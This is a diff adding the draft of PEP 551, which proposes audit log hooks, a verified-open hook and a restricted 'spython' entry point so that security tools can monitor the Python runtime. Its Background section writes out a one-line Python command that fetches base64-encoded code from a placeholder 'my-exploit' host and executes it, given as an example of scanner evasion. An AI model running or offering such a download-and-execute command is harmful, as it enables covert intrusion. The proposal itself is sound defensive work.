@@ -1,0 +1,614 @@
+PEP: 551
+Title: Security transparency in the Python runtime
+Version: $Revision$
+Last-Modified: $Date$
+Author: Steve Dower <steve.dower@microsoft.com>
+Status: Draft
+Type: Standards Track
+Content-Type: text/x-rst
+Created: 23-Aug-2017
+Python-Version: 3.7
+Post-History:
+
+Abstract
+========
+
+This PEP describes additions to the Python API and specific behaviors for the
+CPython implementation that make actions taken by the Python runtime visible to
+security and auditing tools. The goals in order of increasing importance are to
+prevent malicious use of Python, to detect and report on malicious use, and most
+importantly to detect attempts to bypass detection. Most of the responsibility
+for implementation is required from users, who must customize and build Python
+for their own environment.
+
+We propose two small sets of public APIs to enable users to reliably build their
+copy of Python without having to modify the core runtime, protecting future
+maintainability. We also discuss recommendations for users to help them develop
+and configure their copy of Python.
+
+Background
+==========
+
+Software vulnerabilities are generally seen as bugs that enable remote or
+elevated code execution. However, in our modern connected world, the more
+dangerous vulnerabilities are those that enable advanced persistent threats
+(APTs). APTs are achieved when an attacker is able to penetrate a network,
+establish their software on one or more machines, and over time extract data or
+intelligence. Some APTs may make themselves known by maliciously damaging data
+(e.g., `WannaCrypt <https://www.microsoft.com/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/WannaCrypt>`_)
+or hardware (e.g., `Stuxnet <https://www.microsoft.com/wdsi/threats/malware-encyclopedia-description?name=Win32/Stuxnet>`_).
+Most attempt to hide their existence and avoid detection. APTs often use a
+combination of traditional vulnerabilities, social engineering, phishing (or
+spear-phishing), thorough network analysis, and an understanding of
+misconfigured environments to establish themselves and do their work.
+
+The first infected machines may not be the final target and may not require
+special privileges. For example, an APT that is established as a
+non-administrative user on a developer’s machine may have the ability to spread
+to production machines through normal deployment channels. It is common for APTs
+to persist on as many machines as possible, with sheer weight of presence making
+them difficult to remove completely.
+
+Whether an attacker is seeking to cause direct harm or hide their tracks, the
+biggest barrier to detection is a lack of insight. System administrators with
+large networks rely on distributed logs to understand what their machines are
+doing, but logs are often filtered to show only error conditions. APTs that are
+attempting to avoid detection will rarely generate errors or abnormal events.
+Reviewing normal operation logs involves a significant amount of effort, though
+work is underway by a number of companies to enable automatic anomaly detection
+within operational logs. The tools preferred by attackers are ones that are
+already installed on the target machines, since log messages from these tools
+are often expected and ignored in normal use.
+
+At this point, we are not going to spend further time discussing the existence
+of APTs or methods and mitigations that do not apply to this PEP. For further
+information about the field, we recommend reading or watching the resources
+listed under `Further Reading`_.
+
+Python is a particularly interesting tool for attackers due to its prevalence on
+server and developer machines, its ability to execute arbitrary code provided as
+data (as opposed to native binaries), and its complete lack of internal logging.
+This allows attackers to download, decrypt, and execute malicious code with a
+single command::
+
+    python -c "import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('http://my-exploit/py.b64')).decode())"
+
+This command currently bypasses most anti-malware scanners that rely on
+recognizable code being read through a network connection or being written to
+disk (base64 is often sufficient to bypass these checks). It also bypasses
+protections such as file access control lists or permissions (no file access
+occurs), approved application lists (assuming Python has been approved for other
+uses), and automated auditing or logging (assuming Python is allowed to access
+the internet or access another machine on the local network from which to obtain
+its payload).
+
+General consensus among the security community is that totally preventing
+attacks is infeasible and defenders should assume that they will often detect
+attacks only after they have succeeded. This is known as the "assume breach"
+mindset. [1]_ In this scenario, protections such as sandboxing and input
+validation have already failed, and the important task is detection, tracking,
+and eventual removal of the malicious code. To this end, the primary feature
+required from Python is security transparency: the ability to see what
+operations the Python runtime is performing that may indicate anomalous or
+malicious use. Preventing such use is valuable, but secondary to the need to
+know that it is occurring.
+
+To summarise the goals in order of increasing importance:
+
+* preventing malicious use is valuable
+* detecting malicious use is important
+* detecting attempts to bypass detection is critical
+
+One example of a scripting engine that has addressed these challenges is
+PowerShell, which has recently been enhanced towards similar goals of
+transparency and prevention. [2]_
+
+Generally, application and system configuration will determine which events
+within a scripting engine are worth logging. However, given the value of many
+logs events are not recognized until after an attack is detected, it is
+important to capture as much as possible and filter views rather than filtering
+at the source (see the No Easy Breach video from above). Events that are always
+of interest include attempts to bypass event logging, attempts to load and
+execute code that is not correctly signed or access-controlled, use of uncommon
+operating system functionality such as debugging or inter-process inspection
+tools, most network access and DNS resolution, and attempts to create and hide
+files or configuration settings on the local machine.
+
+To summarize, defenders have a need to audit specific uses of Python in order to
+detect abnormal or malicious usage. Currently, the Python runtime does not
+provide any ability to do this, which (anecdotally) has led to organizations
+switching to other languages. The aim of this PEP is to enable system
+administrators to deploy a security transparent copy of Python that can
+integrate with their existing auditing and protection systems.
+
+On Windows, some specific features that may be enabled by this include:
+
+* Script Block Logging [3]_
+* DeviceGuard [4]_
+* AMSI [5]_
+* Persistent Zone Identifiers [6]_
+* Event tracing (which includes event forwarding) [7]_
+
+On Linux, some specific features that may be integrated are:
+
+* gnupg [8]_
+* sd_journal [9]_
+* OpenBSM [10]_
+* syslog [11]_
+* check execute bit on imported modules
+
+
+On macOS, some features that may be used with the expanded APIs are:
+
+* OpenBSM [10]_
+* syslog [11]_
+
+Overall, the ability to enable these platform-specific features on production
+machines is highly appealing to system administrators and will make Python a
+more trustworthy dependency for application developers.
+
+
+Overview of Changes
+===================
+
+True security transparency is not fully achievable by Python in isolation. The
+runtime can log as many events as it likes, but unless the logs are reviewed and
+analyzed there is no value. Python may impose restrictions in the name of
+security, but usability may suffer. Different platforms and environments will
+require different implementations of certain security features, and
+organizations with the resources to fully customize their runtime should be
+encouraged to do so.
+
+The aim of these changes is to enable system administrators to integrate Python
+into their existing security systems, without dictating what those systems look
+like or how they should behave. We propose two API changes to enable this: an
+Event Log Hook and Verified Open Hook. Both are not set by default, and both
+require modifying the appropriate entry point to enable any functionality. For
+the purposes of validation and example, we propose a new spython/spython.exe
+entry point program that enables some basic functionality using these hooks.
+However, the expectation is that security-conscious organizations will create
+their own entry points to meet their needs.
+
+Event Log Hook
+--------------
+
+In order to achieve security transparency, an API is required to raise messages
+from within certain operations. These operations are typically deep within the
+Python runtime or standard library, such as dynamic code compilation, module
+imports, DNS resolution, or use of certain modules such as ``ctypes``.
+
+The new APIs required for log hooks are::
+
+    # Add a logging hook
+    sys.addloghook(hook: Callable[str, tuple]) -> None
+    int PySys_AddLogHook(int (*hook)(const char *event, PyObject *args));
+
+    # Raise an event with all logging hooks
+    sys.loghook(str, *args) -> None
+    int PySys_LogHook(const char *event, PyObject *args);
+
+    # Internal API used during Py_Finalize() - not publicly accessible
+    void _Py_ClearLogHooks(void);
+
+Hooks are added by calling ``PySys_AddLogHook()`` from C at any time, including
+before ``Py_Initialize()``, or by calling ``sys.addloghook()`` from Python code.
+Hooks are never removed or replaced, and existing hooks have an opportunity to
+refuse to allow new hooks to be added (adding a logging hook is logged, and so
+preexisting hooks can raise an exception to block the new addition).
+
+When events of interest are occurring, code can either call ``PySys_LogHook()``
+from C (while the GIL is held) or ``sys.loghook()``. The string argument is the
+name of the event, and the tuple contains arguments. A given event name should
+have a fixed schema for arguments, and both arguments are considered a public
+API (for a given x.y version of Python), and thus should only change between
+feature releases with updated documentation.
+
+When an event is logged, each hook is called in the order it was added with the
+event name and tuple. If any hook returns with an exception set, later hooks are
+ignored and *in general* the Python runtime should terminate. This is
+intentional to allow hook implementations to decide how to respond to any
+particular event. The typical responses will be to log the event, abort the
+operation with an exception, or to immediately terminate the process with an
+operating system exit call.
+
+When an event is logged but no hooks have been set, the ``loghook()`` function
+should include minimal overhead. Ideally, each argument is a reference to
+existing data rather than a value calculated just for the logging call.
+
+As hooks may be Python objects, they need to be freed during ``Py_Finalize()``.
+To do this, we add an internal API ``_Py_ClearLogHooks()`` that releases any
+``PyObject*`` hooks that are held, as well as any heap memory used. This is an
+internal function with no public export, but it passes an event to all existing
+hooks to ensure that unexpected calls are logged.
+
+See `Log Hook Locations`_ for proposed log hook points and schemas, and the
+`Recommendations`_ section for discussion on appropriate responses.
+
+Verified Open Hook
+------------------
+
+Most operating systems have a mechanism to distinguish between files that can be
+executed and those that can not. For example, this may be an execute bit in the
+permissions field, or a verified hash of the file contents to detect potential
+code tampering. These are an important security mechanism for preventing
+execution of data or code that is not approved for a given environment.
+Currently, Python has no way to integrate with these when launching scripts or
+importing modules.
+
+The new public API for the verified open hook is::
+
+    # Set the handler
+    int Py_SetOpenForExecuteHandler(PyObject *(*handler)(const char *narrow, const wchar_t *wide))
+
+    # Open a file using the handler
+    os.open_for_exec(pathlike)
+
+The ``os.open_for_exec()`` function is a drop-in replacement for
+``open(pathlike, 'rb')``. Its default behaviour is to open a file for raw,
+binary access - any more restrictive behaviour requires the use of a custom
+handler. (Aside: since ``importlib`` requires access to this function before the
+``os`` module has been imported, it will be available on the ``nt``/``posix``
+modules, but the intent is that other users will access it through the ``os``
+module.)
+
+A custom handler may be set by calling ``Py_SetOpenForExecuteHandler()`` from C
+at any time, including before ``Py_Initialize()``. When ``open_for_exec()`` is
+called with a handler set, the handler will be passed the processed narrow or
+wide path, depending on platform, and its return value will be returned
+directly. The returned object should be an open file-like object that supports
+reading raw bytes. This is explicitly intended to allow a ``BytesIO`` instance
+if the open handler has already had to read the file into memory in order to
+perform whatever verification is necessary to determine whether the content is
+permitted to be executed.
+
+Note that these handlers can import and call the ``_io.open()`` function on
+CPython without triggering themselves.
+
+If the handler determines that the file is not suitable for execution, it should
+raise an exception of its choice, as well as performing any other logging or
+notifications.
+
+All import and execution functionality involving code from a file will be
+changed to use ``open_for_exec()`` unconditionally. It is important to note that
+calls to ``compile()``, ``exec()`` and ``eval()`` do not go through this
+function - a log hook that includes the code from these calls will be added and
+is the best opportunity to validate code that is read from the file. Given the
+current decoupling between import and execution in Python, most imported code
+will go through both ``open_for_exec()`` and the log hook for ``compile``, and
+so care should be taken to avoid repeating verification steps.
+
+API Availability
+----------------
+
+While all the functions added here are considered public and stable API, the
+behavior of the functions is implementation specific. The descriptions here
+refer to the CPython implementation, and while other implementations should
+provide the functions, there is no requirement that they behave the same.
+
+For example, ``sys.addloghook()`` and ``sys.loghook()`` should exist but may do
+nothing. This allows code to make calls to ``sys.loghook()`` without having to
+test for existence, but it should not assume that its call will have any effect.
+(Including existence tests in security-critical code allows another vector to
+bypass logging, so it is preferable that the function always exist.)
+
+``os.open_for_exec()`` should at a minimum always return ``_io.open(pathlike,
+'rb')``. Code using the function should make no further assumptions about what
+may occur, and implementations other than CPython are not required to let
+developers override the behavior of this function with a hook.
+
+
+Log Hook Locations
+==================
+
+Calls to ``sys.loghook()`` or ``PySys_LogHook()`` will be added to the following
+operations with the schema shown:
+
+``sys.addloghook`` / ``Py_AddLogHook``
+    Schema: ``"addloghook", ()``
+
+    This event allows log hooks to prevent other hooks from being added. It is
+    called before the new hook is added, and the new hook does not receive this
+    event.
+
+``_Py_ClearLogHooks``
+    Schema: ``"clearloghooks", ()``
+
+    Log hooks are freed during Py_Finalize. This event notifies hooks so that
+    loggers can record it in case the event is triggered unexpectedly. Freeing hooks
+    cannot be aborted.
+
+``Py_SetOpenForExecuteHandler``
+    Schema: ``"setopenforexecutehandler", ()``
+
+    This allows log hooks to prevent the open_for_execute handler being changed. It
+    is called before the new handler is set.
+
+``compile`` / ``exec`` / ``eval`` / ``PyAst_CompileString``
+    Schema: ``"compile", (code, filename_or_none)``
+
+    This allows log hooks to selectively prevent dynamic code execution. Note that
+    this will also be called for regular imports where those imports are loading
+    source code.
+
+    It also enables transcription of all code used by Python. Note that this will
+    produce very large logs for most applications.
+
+``import``
+    Schema: ``"import", (module, filename, sys.path, sys.meta_path,
+    sys.path_hooks)``
+
+    This allows log hooks to collect information about modules that are used, and to
+    selectively prevent import of certain modules. All arguments other than the
+    module name may be None if they are not used or available.
+
+``_ctypes.dlopen`` / ``_ctypes.LoadLibrary``
+    Schema: ``ctypes.dlopen", (module_or_path,)``
+
+    This allows log hooks to collect information about native modules that are used,
+    and to selectively prevent loading of certain native modules.
+
+``_ctypes._FuncPtr``
+    Schema: ``"ctypes.dlsym", (lib_object, name)``
+
+    This allows log hooks to collect information about getting specific symbols from
+    native modules, and to selectively prevent accessing those symbols.
+
+``_ctypes._CData``
+    Schema: ``"ctypes.cdata", (ptr_as_int, )``
+
+    This allows log hooks to detect when code is accessing arbitrary memory using
+    ctypes.
+
+``sys._getframe``
+    Schema: ``"sys._getframe", (frame_object, )``
+
+    Allows log hooks to detect when code is accessing frames directly, and to
+    selectively prevent access.
+
+``sys._current_frames``
+    Schema: ``"sys._current_frames", ()``
+
+    Allows log hooks to detect when code is accessing frames directly, and to
+    selectively prevent access.
+
+``sys.setprofile`` / ``sys.settrace`` / ``PyEval_SetProfile`` / ``PyEval_SetTrace``
+    Schema: ``"sys.<function_name>", ()``
+
+    Allows log hooks to detect when code is injecting trace functions. Because of
+    the way that tracing hooks are implemented, it is not safe to pass the function
+    to the log hook.
+
+    Note that ``threading.set[profile/trace]()`` eventually calls
+    ``sys.set[profile/trace]()``, and so the event will be logged for each thread
+    that is traced using this functionality.
+
+``sys.set_asyncgen_hooks`` / ``sys.set_coroutine_wrapper`` / ``sys.setrecursionlimit`` / ``sys.setswitchinterval``
+    Schema: ``"sys.<function_name>", (function arguments)``
+
+    Allows log hooks to detect when code is modifying the runtime state, and to
+    selectively disallow it. Where these are also available as a public C API, the
+    hook should be in that API with the same name and arguments.
+
+``_socket.Socket.bind``
+    Schema: ``"socket.bind", (address,)``
+
+    Allows log hooks to detect access to network resources, and to selectively
+    disallow it. The address is passed through unmodified from the orginal call.
+
+``_socket.Socket.bind`` / ``_socket.Socket.connect`` / ``_socket.Socket.connect_ex`` / ``_socket.Socket.sendto`` / ``_socket.Socket.sendmsg``
+    Schema: ``"socket.connect", (address,)``
+
+    Allows log hooks to detect access to network resources, and to selectively
+    disallow it. The address is passed through unmodified from the orginal call.
+
+``_socket.Socket.__init__``
+    Schema: ``"socket.Socket", (family, type, proto)``
+
+    Allows log hooks to detect when sockets are created. Family, type and proto will
+    be the integer values.
+
+``_socket.gethostname``
+    Schema: ``"socket.gethostname", ()``
+
+    Allows log hooks to detect attempts to retrieve the current host name and to
+    selectively disallow it.
+
+``_socket.sethostname``
+    Schema: ``"socket.sethostname", (name,)``
+
+    Allows log hooks to detect attempts to set the current host name and to
+    selectively disallow it. The name argument is passed as a bytes object.
+
+``_socket.gethostbyname`` / ``_socket.gethostbyname_ex``
+    Schema: ``"socket.gethostbyname", (name,)``
+
+    Allows log hooks to detect name resolution and to selectively disallow it. The
+    name argument is passed as a str.
+
+``_socket.gethostbyaddr``
+    Schema: ``"socket.gethostbyaddr", (address,)``
+
+    Allows log hooks to detect host resolution and to selectively disallow it. The
+    address argument is passed as a str.
+
+``_socket.getservbyname``
+    Schema: ``"socket.getservbyname", (name,)``
+
+    Allows log hooks to detect service resolution and to selectively disallow it.
+    The name argument is passed as a str.
+
+``_socket.getservbyport``
+    Schema: ``"socket.getservbypont", (port,)``
+
+    Allows log hooks to detect service resolution and to selectively disallow it.
+    The port argument is passed as an integer.
+
+``_socket.getprotobyname``
+    Schema: ``"socket.getprotobyname", (name,)``
+
+    Allows log hooks to detect protocol number access and to selectively disallow
+    it. The name argument is passed as a str.
+
+TODO - hooks in ``_socket``, ``_ssl``, others?
+
+
+SPython Entry Point
+===================
+
+A new entry point binary will be added, called ``spython.exe`` on Windows and
+``spythonX.Y`` on other platforms. This entry point is intended primarily as an
+example, as we expect most users of this functionality to implement their own
+entry point and hooks (see `Recommendations`_). It will also be used for tests.
+
+Source builds will create ``spython`` by default, but distributors may choose
+whether to include ``spython`` in their pre-built packages. The python.org
+managed binary distributions will not include ``spython``.
+
+**Do not accept most command-line arguments**
+
+The ``spython`` entry point requires a script file be passed as the first
+argument, and does not allow any options. This prevents arbitrary code execution
+from in-memory data or non-script files (such as pickles, which can be executed
+using ``-m pickle <path>``.
+
+Options ``-B`` (do not write bytecode), ``-E`` (ignore environment variables)
+and ``-s`` (no user site) are assumed.
+
+If a file with the same full path as the process with a ``._pth`` suffix
+(``spython._pth`` on Windows, ``spythonX.Y._pth`` on Linux) exists, it will be
+used to initialize ``sys.path`` following the rules currently described `for
+Windows <https://docs.python.org/3/using/windows.html#finding-modules>`_.
+
+**Log security events to a file**
+
+Before initialization, ``spython`` will set a log hook that writes events to a
+local file. By default, this file is the full path of the process with a
+``.log`` suffix, but may be overridden with the ``SPYTHONLOG`` environment
+variable (despite such overrides being explicitly discouraged in
+`Recommendations`_).
+
+The log hook will also abort all ``addloghook`` events, preventing any other
+hooks from being added.
+
+On Windows, code from ``compile`` events will submitted to AMSI [5]_ and if it
+fails to validate, the compile event will be aborted. This can be tested by
+calling ``compile()`` or ``eval()`` on the contents of the `EICAR test file
+<http://www.eicar.org/86-0-Intended-use.html>`_.
+
+**Restrict importable modules**
+
+Also before initialization, ``spython`` will set an open-for-execute hook that
+validates all files opened with ``os.open_for_exec``. This implementation will
+require all files to have a ``.py`` suffix (thereby blocking the use of cached
+bytecode), and will raise a custom log message ``spython.open_for_exec``
+containing ``(filename, True_if_allowed)``.
+
+On Windows, the hook will also open the file with flags that prevent any other
+process from opening it with write access, which allows the hook to perform
+additional validation on the contents with confidence that it will not be
+modified between the check and use. Compilation will later trigger a ``compile``
+event, so there is no need to read the contents now for AMSI, but other
+validation mechanisms such as DeviceGuard [4]_ should be performed here.
+
+
+Performance Impact
+==================
+
+Full impact analysis still requires investigation. Preliminary testing shows
+that calling ``sys.loghook`` with no hooks added does not significantly affect
+any existing benchmarks, though targeted microbenchmarks can observe an impact.
+
+Performance impact using ``spython`` or with hooks added are not of interest
+here, since this is considered opt-in functionality.
+
+
+Recommendations
+===============
+
+TODO
+
+
+Further Reading
+===============
+
+
+**Redefining Malware: When Old Terms Pose New Threats**
+    By Aviv Raff for SecurityWeek, 29th January 2014
+
+    This article, and those linked by it, are high-level summaries of the rise of
+    APTs and the differences from "traditional" malware.
+
+    `<http://www.securityweek.com/redefining-malware-when-old-terms-pose-new-threats>`_
+
+**Anatomy of a Cyber Attack**
+    By FireEye, accessed 23rd August 2017
+
+    A summary of the techniques used by APTs, and links to a number of relevant
+    whitepapers.
+
+    `<https://www.fireeye.com/current-threats/anatomy-of-a-cyber-attack.html>`_
+
+**Automated Traffic Log Analysis: A Must Have for Advanced Threat Protection**
+    By Aviv Raff for SecurityWeek, 8th May 2014
+
+    High-level summary of the value of detailed logging and automatic analysis.
+
+    `<http://www.securityweek.com/automated-traffic-log-analysis-must-have-advanced-threat-protection>`_
+
+**No Easy Breach: Challenges and Lessons Learned from an Epic Investigation**
+    Video presented by Matt Dunwoody and Nick Carr for Mandiant at SchmooCon 2016
+
+    Detailed walkthrough of the processes and tools used in detecting and removing
+    an APT.
+
+    `<https://archive.org/details/No_Easy_Breach>`_
+
+**Disrupting Nation State Hackers**
+    Video presented by Rob Joyce for the NSA at USENIX Enigma 2016
+
+    Good security practices, capabilities and recommendations from the chief of
+    NSA's Tailored Access Operation.
+
+    `<https://www.youtube.com/watch?v=bDJb8WOJYdA>`_
+
+References
+==========
+
+.. [1] Assume Breach Mindest, `<http://asian-power.com/node/11144>`_
+
+.. [2] PowerShell Loves the Blue Team, `<https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/>`_
+
+.. [3] Script Block Logging, `<https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html>`_
+
+.. [4] DeviceGuard, `<https://aka.ms/deviceguard>`_
+
+.. [5] AMSI, `<https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx>`_
+
+.. [6] Persistent Zone Identifiers, `<https://msdn.microsoft.com/en-us/library/ms537021(v=vs.85).aspx>`_
+
+.. [7] Event tracing, `<https://msdn.microsoft.com/en-us/library/aa363668(v=vs.85).aspx>`_
+
+.. [8] gnupg, `<https://www.gnupg.org/>`_
+
+.. [9] sd_journal, `<https://www.systutorials.com/docs/linux/man/3-sd_journal_send/>`_
+
+.. [10] OpenBSM, `<http://www.trustedbsd.org/openbsm.html>`_
+
+.. [11] syslog, `<https://linux.die.net/man/3/syslog>`_
+
+Acknowledgments
+===============
+
+Thanks to all the people from Microsoft involved in helping make the Python
+runtime safer for production use, and especially to James Powell for doing much
+of the initial research, analysis and implementation, Lee Holmes for invaluable
+insights into the info-sec field and PowerShell's responses, and Brett Cannon
+for the grounding discussions.
+
+Copyright
+=========
+
+Copyright (c) 2017 by Microsoft Corporation. This material may be distributed
+only subject to the terms and conditions set forth in the Open Publication
+License, v1.0 or later (the latest version is presently available at
+http://www.opencontent.org/openpub/).
